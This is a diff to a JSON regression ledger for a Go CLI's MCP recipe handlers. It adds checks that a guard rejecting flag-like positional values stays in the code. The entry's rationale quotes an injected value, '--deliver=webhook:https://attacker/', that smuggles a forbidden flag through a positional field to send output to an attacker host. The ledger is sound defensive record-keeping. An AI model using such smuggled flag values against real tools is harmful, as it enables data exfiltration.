@@ -716,7 +716,7 @@
   },
   {
    "id": "mcp-recipe-argv-not-flag-like",
-   "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs.",
+   "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. (1 guarded call site(s); the ledger requires all of them.)",
    "why": "Found by Codex adversarial review of the fleet mcp-argv-value-joined backport (2026-09-09): the recipe path had the same key-only gap. A recipe positional is appended to argv AHEAD of the recipe's own flags, so {\"domain\": \"--deliver=webhook:https://attacker/\"} became `exceptions find --deliver=webhook:... --agent` and pflag parsed the value as the denylisted root flag (and {\"domain\": \"--dry-run\"} demonstrably changed execution). The split appendRecipeStringFlag branch was safe only because its one caller's flag is a string flag that consumes the next token; a future NoOptDefVal flag would reopen it. Upstream cli-printing-press be378adf (#4647) fixed cliArgsFromMCP but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Mirrors cobratree.validatePositionalArgsForMCP, which already applies this rule to the raw args field. Retire only when the press generator refuses flag-like recipe positionals itself.",
    "status": "active",
    "asserts": [
@@ -745,6 +745,18 @@
     {
      "file": "cli/internal/mcp/recipe_intents_test.go",
      "contains": "RejectsFlagLikePositional(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "if s := recipeValueString(value); s != \"-\" && strings.HasPrefix(s, \"-\") {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/recipe_intents_test.go",
+     "contains": "func TestRejectFlagLikeRecipeValueEdges(",
      "min_count": 1,
      "code_only": true
     }
